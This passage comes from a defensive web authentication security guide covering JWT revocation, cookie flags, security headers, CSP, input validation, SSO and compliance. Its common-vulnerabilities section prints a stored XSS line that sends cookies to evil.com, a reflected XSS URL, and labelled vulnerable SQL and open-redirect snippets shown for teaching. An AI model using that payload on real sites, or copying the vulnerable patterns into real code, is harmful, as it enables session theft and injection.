### JWKS Security Rules
- Always fetch keys from trusted JWKS endpoint, never from the token itself
- Cache keys for 5-15 minutes
- Support multiple active keys during rotation
- Fail closed if key cannot be found for a given `kid`

---

## 20. Token Revocation and Blacklisting

### Why Token Revocation?

JWTs are stateless — they're valid until expiration. You need a revocation mechanism for:
- User logout
- Password changes
- Security breaches
- Account deactivation

### Redis-Based Blacklist

```javascript
const redis = require('redis');
const client = redis.createClient();

async function revokeToken(token) {
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  if (ttl > 0) {
    await client.setEx(`blacklist:${token}`, ttl, 'revoked');
  }
}

async function isTokenRevoked(token) {
  const result = await client.get(`blacklist:${token}`);
  return result !== null;
}

// Middleware
app.use(async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (token && await isTokenRevoked(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  next();
});
```

### Token Version Strategy

```javascript
// Store a tokenVersion on the user record
const generateAccessToken = (user) => jwt.sign(
  { sub: user.id, tokenVersion: user.tokenVersion },
  SECRET, { expiresIn: '15m' }
);

// On logout/password change, increment tokenVersion
await db.users.updateOne({ _id: userId }, { $inc: { tokenVersion: 1 } });

// On verification, check version
if (decoded.tokenVersion !== user.tokenVersion) {
  return res.status(401).json({ error: 'Token revoked' });
}
```

### Strategies Comparison

| Strategy | Latency | Scalability | Complexity |
|----------|---------|-------------|------------|
| Redis blacklist | Low (single lookup) | High | Low |
| Token version | Low (DB lookup per request) | Medium | Low |
| Short expiry + refresh | No lookup needed | Very high | Medium |
| Opaque tokens + DB | Medium | Medium | High |

---

## 21. Secure Cookie Attributes

### Cookie Security Flags

```
Set-Cookie: sessionId=abc123;
  HttpOnly;      // Prevents JavaScript access (XSS protection)
  Secure;        // Only sent over HTTPS
  SameSite=Lax;  // Controls cross-site behavior
  Path=/;        // Cookie scope
  Domain=.example.com;  // Cookie domain
  Max-Age=3600;  // Expiration in seconds
```

### Attribute Details

| Attribute | Purpose | Recommended Value |
|-----------|---------|-------------------|
| `HttpOnly` | Prevents JS access (`document.cookie`) | `true` for auth cookies |
| `Secure` | HTTPS only | `true` in production |
| `SameSite` | Cross-site request control | `Strict` or `Lax` |
| `Path` | URL scope | `/` for app-wide |
| `Domain` | Domain scope | Specific domain, not `.` prefix |
| `Max-Age` / `Expires` | Lifetime | Match session duration |
| `SameSite=None` | Cross-site allowed | Must also set `Secure` |

### SameSite Deep Dive

```
SameSite=Strict
  → Cookie NEVER sent cross-site
  → Most secure, but user arriving from external link won't be recognized

SameSite=Lax (Chrome default)
  → Cookie sent with top-level GET navigations
  → Good balance of security and usability

SameSite=None; Secure
  → Cookie sent with all cross-site requests
  → Required for OAuth flows, cross-origin APIs
```

---

## 22. HTTP Security Headers

### Essential Security Headers

```javascript
const helmet = require('helmet');
app.use(helmet());
```

### Key Headers

| Header | Value | Purpose |
|--------|-------|---------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Prevent clickjacking |
| `X-XSS-Protection` | `1; mode=block` | Legacy XSS filter (deprecated, use CSP) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control referrer leakage |
| `Permissions-Policy` | `camera=(), microphone=()` | Disable unused browser features |
| `Content-Security-Policy` | (see CSP section) | Control resource loading |
| `Cross-Origin-Opener-Policy` | `same-origin` | Isolate browsing context |
| `Cross-Origin-Resource-Policy` | `same-origin` | Control resource embedding |

### Full Security Headers Middleware

```javascript
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '0');  // Rely on CSP instead
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  next();
});
```

---

## 23. Content Security Policy (CSP)

### What is CSP?

CSP restricts which resources (scripts, styles, images, etc.) a page can load, mitigating XSS and data injection attacks.

### CSP Directives

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'nonce-random123' https://trusted-cdn.com",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self' https://fonts.gstatic.com",
    "connect-src 'self' https://api.example.com",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "upgrade-insecure-requests"
  ].join('; '));
  next();
});
```

### CSP Directives Reference

| Directive | Controls | Example |
|-----------|----------|---------|
| `default-src` | Fallback for all resource types | `'self'` |
| `script-src` | JavaScript loading | `'self' 'nonce-abc'` |
| `style-src` | CSS loading | `'self' 'unsafe-inline'` |
| `img-src` | Image loading | `'self' data: https:` |
| `connect-src` | AJAX, WebSocket, EventSource | `'self' https://api.example.com` |
| `frame-ancestors` | Who can embed this page | `'none'` |
| `base-uri` | `<base>` tag URL | `'self'` |
| `form-action` | Form submission targets | `'self'` |

### Nonce-Based CSP

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}'`
  );
  next();
});

// In HTML template
// <script nonce="<%= nonce %>">...</script>
```

---

## 24. Input Validation and Sanitization

### Why It Matters

Injection attacks (SQL injection, XSS, command injection) exploit unvalidated input. Every input point is an attack surface.

### Validation with express-validator

```javascript
const { body, validationResult } = require('express-validator');

app.post('/users',
  [
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 8 }).matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/),
    body('name').trim().escape().isLength({ min: 1, max: 100 }),
    body('age').optional().isInt({ min: 0, max: 150 })
  ],
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // Process valid input
  }
);
```

### SQL Injection Prevention

```javascript
// DANGEROUS: String concatenation
const query = `SELECT * FROM users WHERE id = '${userId}'`;

// SAFE: Parameterized queries
const query = 'SELECT * FROM users WHERE id = $1';
const result = await db.query(query, [userId]);

// SAFE: ORM (Prisma, Sequelize, etc.)
const user = await prisma.user.findUnique({ where: { id: userId } });
```

### XSS Prevention

```javascript
const DOMPurify = require('isomorphic-dompurify');

// Sanitize HTML input
const clean = DOMPurify.sanitize(userInput);

// Use Content Security Policy (see section 23)
// Use frameworks that auto-escape (React, Vue, etc.)
// Never use innerHTML with user input
```

### Validation Best Practices
- Validate on both client AND server (server is authoritative)
- Use allowlists (what's permitted) not blocklists (what's blocked)
- Validate type, length, format, and range
- Sanitize output for different contexts (HTML, URL, CSS, JS)
- Use parameterized queries or ORMs
- Limit request body size

---

## 25. Common Vulnerabilities

### XSS (Cross-Site Scripting)

**Attack:** Inject malicious scripts into pages viewed by other users.

```html
<!-- Stored XSS -->
<script>document.location='https://evil.com/?cookie='+document.cookie</script>

<!-- Reflected XSS in URL -->
https://example.com/search?q=<script>alert(1)</script>
```

**Prevention:**
- Output encoding/escaping
- Content Security Policy
- HTTPOnly cookies
- Input validation and sanitization
- Use frameworks with auto-escaping (React, Vue)

### CSRF (Cross-Site Request Forgery)

**Attack:** Trick authenticated user's browser into making unwanted requests. See Section 10.

### Session Fixation

**Attack:** Attacker sets a known session ID before the user authenticates, then hijacks the session after login.

**Prevention:**
```javascript
app.post('/login', (req, res) => {
  // Authenticate user...
  req.session.regenerate((err) => {
    req.session.userId = user.id;
    res.json({ success: true });
  });
});
```

### Token Leakage

**Attack:** JWTs exposed in URLs, logs, browser storage, or Referer headers.

**Prevention:**
- Never put tokens in URLs
- Store in httpOnly cookies or in-memory
- Use `Referrer-Policy` header
- Don't log Authorization headers
- Use HTTPS everywhere

### Open Redirect

**Attack:** Attacker exploits redirect parameters to redirect users to malicious sites.

```javascript
// DANGEROUS
app.get('/redirect', (req, res) => res.redirect(req.query.url));

// SAFE: Validate against allowlist
const allowedRedirects = ['/dashboard', '/profile', '/settings'];
app.get('/redirect', (req, res) => {
  if (allowedRedirects.includes(req.query.url)) {
    res.redirect(req.query.url);
  } else {
    res.redirect('/dashboard');
  }
});
```

### IDOR (Insecure Direct Object Reference)

**Attack:** Accessing resources by modifying ID parameters (e.g., `/api/users/123` → `/api/users/124`).

**Prevention:** Always verify the authenticated user owns the requested resource.

---

## 26. Authentication in REST vs GraphQL

### REST API Authentication

```
GET /api/users/me
Authorization: Bearer eyJhbG...

Response:
{ "id": 123, "name": "Alice", "email": "alice@example.com" }
```

- Each endpoint independently checks authentication
- Middleware pattern: `app.use('/api', authMiddleware)`
- Stateless with JWT, or stateful with sessions

### GraphQL Authentication

```javascript
const { ApolloServer } = require('@apollo/server');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  context: async ({ req }) => {
    const token = req.headers.authorization?.split(' ')[1];
    const user = token ? await verifyToken(token) : null;
    return { user };
  }
});

// Resolver-level authorization
const resolvers = {
  Query: {
    me: (parent, args, context) => {
      if (!context.user) throw new AuthenticationError('Not authenticated');
      return context.user;
    },
    adminUsers: (parent, args, context) => {
      if (context.user?.role !== 'admin') throw new ForbiddenError('Admin only');
      return db.users.findMany();
    }
  }
};
```

### REST vs GraphQL Auth Comparison

| Aspect | REST | GraphQL |
|--------|------|---------|
| Auth placement | Middleware/route-level | Resolver/context-level |
| Granularity | Per endpoint | Per field/query |
| Exposure | Explicit endpoints | Schema introspection |
| Rate limiting | Per endpoint | Per query complexity |
| Error format | HTTP status codes | GraphQL errors in response |

---

## 27. Microservices Authentication

### API Gateway Pattern

```
Client → API Gateway → Auth Service → Microservices
              ↓
        Validates JWT
        Routes request
        Applies rate limiting
```

```javascript
// API Gateway auth middleware
async function gatewayAuth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });

  try {
    const decoded = await verifyJWT(token);
    req.user = decoded;
    req.headers['x-user-id'] = decoded.sub;
    req.headers['x-user-roles'] = JSON.stringify(decoded.roles);
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

### Service-to-Service Authentication

**Mutual TLS (mTLS):**
```
Service A ←TLS with client cert→ Service B
```

**Service Accounts with JWT:**
```javascript
// Service A: Generate short-lived token for Service B
const serviceToken = jwt.sign(
  { sub: 'service-a', aud: 'service-b', scope: 'read:data' },
  servicePrivateKey,
  { algorithm: 'RS256', expiresIn: '5m' }
);

// Service B: Verify token
const decoded = jwt.verify(serviceToken, serviceAPublicKey, {
  algorithms: ['RS256'],
  audience: 'service-b',
  issuer: 'service-a'
});
```

### Zero-Trust Principles for Microservices
- Never trust, always verify
- Authenticate every request
- Encrypt all traffic (mTLS)
- Least privilege access
- Audit all access

---

## 28. Zero Trust Architecture

### Core Principles

1. **Verify explicitly** — Authenticate and authorize every request
2. **Least privilege access** — Grant minimum necessary permissions
3. **Assume breach** — Design as if attacker is already inside

### Implementation Components

| Component | Purpose |
|-----------|---------|
| Identity Provider (IdP) | Centralized authentication |
| Policy Engine | Access decision based on context |
| Policy Enforcement Point | Enforces decisions at each access point |
| Device Trust | Verify device health/compliance |
| Network Segmentation | Microsegmentation of resources |
| Continuous Monitoring | Detect anomalous behavior |

### Zero Trust vs Traditional Security

```
Traditional (Castle & Moat):
  User → [Firewall] → Internal Network → Everything Accessible

Zero Trust:
  User → [Identity Verify] → [Device Check] → [Policy Check] → Specific Resource
```

### Zero Trust Implementation Steps
1. Identify sensitive data and assets
2. Map data flows and access patterns
3. Implement strong identity verification (MFA, OIDC)
4. Deploy micro-perimeters around each service
5. Implement least-privilege access policies
6. Continuous monitoring and logging
7. Automate policy enforcement

---

## 29. SSO (Single Sign-On)

### What is SSO?

SSO allows users to authenticate once and access multiple applications without re-entering credentials.

### SAML vs OIDC

| Feature | SAML 2.0 | OIDC (OpenID Connect) |
|---------|----------|----------------------|
| Protocol | XML-based | JSON/JWT-based |
| Transport | HTTP POST/Redirect | HTTP (RESTful) |
| Token | SAML Assertion (XML) | ID Token (JWT) |
| Complexity | High | Low |
| Mobile support | Poor | Excellent |
| Year | 2005 | 2014 |
| Use case | Enterprise (legacy) | Modern web/mobile |

### SAML Flow

```
1. User accesses SP (Service Provider)
2. SP generates SAML AuthnRequest
3. User redirected to IdP (Identity Provider)
4. User authenticates at IdP
5. IdP creates SAML Response with Assertion
6. User redirected back to SP with SAML Response
7. SP validates Assertion and creates session
```

### OIDC SSO Flow

```
1. User accesses RP (Relying Party)
2. RP redirects to OP (OpenID Provider) with Authorization Request
3. User authenticates at OP
4. OP redirects back with Authorization Code
5. RP exchanges code for tokens (ID Token + Access Token)
6. RP validates ID Token and creates session
```

### SSO Implementation with Passport.js

```javascript
const SamlStrategy = require('passport-saml').Strategy;

passport.use(new SamlStrategy({
  entryPoint: process.env.SAML_ENTRY_POINT,
  issuer: process.env.SAML_ISSUER,
  callbackUrl: process.env.SAML_CALLBACK_URL,
  cert: fs.readFileSync('./idp-cert.pem', 'utf-8')
}, (profile, done) => {
  const user = findOrCreateSAMLUser(profile);
  return done(null, user);
}));
```

---

## 30. Compliance Considerations

### GDPR (General Data Protection Regulation)

| Requirement | Implementation |
|-------------|---------------|
| Consent | Explicit consent before data collection |
| Data minimization | Only collect necessary auth data |
| Right to erasure | Account deletion with data purge |
| Data portability | Export user data on request |
| Breach notification | Report within 72 hours |
| Privacy by design | Default privacy-friendly settings |

**Auth implications:**
- Don't store more user data than needed
- Anonymize/pseudonymize where possible
- Provide clear privacy notices
- Allow users to download/delete their data

### SOC 2 (Service Organization Control 2)

Five Trust Service Criteria:
1. **Security** — Protection against unauthorized access
2. **Availability** — System uptime and performance
3. **Processing Integrity** — Accurate, complete, timely processing
4. **Confidentiality** — Restricted access to sensitive information
5. **Privacy** — Personal information handling

**Auth requirements:**
- MFA for privileged access
- Session timeout and re-authentication
- Audit logging of all auth events
- Regular access reviews
- Password policies (complexity, rotation)
- Incident response procedures

### HIPAA (Health Insurance Portability and Accountability Act)

| Rule | Requirement |
|------|-------------|
| Authentication | Unique user ID, emergency access procedure |
| Access Control | Automatic logoff, encryption |
| Audit Controls | Record and examine access to ePHI |
| Integrity Controls | Authenticate ePHI, prevent tampering |
| Transmission Security | Encrypt ePHI in transit |

**Auth specifics:**
- Each user must have a unique identifier
- Automatic session timeout (15 minutes recommended)
- Multi-factor authentication recommended
- Comprehensive audit trails of all access
- Encryption of PHI at rest and in transit

### Security Checklist for All Compliance

```markdown
- [ ] Multi-factor authentication for admin accounts
- [ ] Password policies enforced (min 12 chars, complexity)
- [ ] Session timeout configured (15-30 minutes)
- [ ] All auth events logged with timestamps
- [ ] Failed login attempt monitoring and alerting
- [ ] Account lockout after failed attempts
- [ ] Data encryption at rest and in transit (TLS 1.2+)
- [ ] Regular access reviews and privilege audits
- [ ] Incident response plan documented
- [ ] Data retention and deletion policies
- [ ] Privacy policy published and accessible
- [ ] Regular penetration testing
- [ ] Vulnerability scanning
- [ ] Dependency security auditing
```

---

## Summary: Quick Reference

### Authentication Method Selection

| Use Case | Recommended Method |
|----------|-------------------|
| Web app (server-rendered) | Session + CSRF protection |
| SPA (single-page app) | JWT (httpOnly cookie) or NextAuth.js |
| Mobile app | OAuth 2.0 + PKCE |
| API (machine-to-machine) | Client credentials or mTLS |
| Enterprise SSO | SAML or OIDC |
| Passwordless | Passkeys (WebAuthn) or Magic Links |
| High security | MFA (TOTP + WebAuthn) |

### Security Fundamentals Checklist

- [ ] Never store plaintext passwords (use Argon2id or bcrypt)
- [ ] Always use HTTPS (HSTS header)
- [ ] Implement rate limiting on auth endpoints
- [ ] Use httpOnly, Secure, SameSite cookies
- [ ] Validate all JWT claims (iss, aud, exp, nbf)
- [ ] Implement CSRF protection
- [ ] Set Content Security Policy
- [ ] Validate and sanitize all input
- [ ] Use parameterized queries
- [ ] Implement proper error handling (don't leak info)
- [ ] Log authentication events
- [ ] Rotate secrets and signing keys regularly
- [ ] Apply principle of least privilege
- [ ] Keep dependencies updated
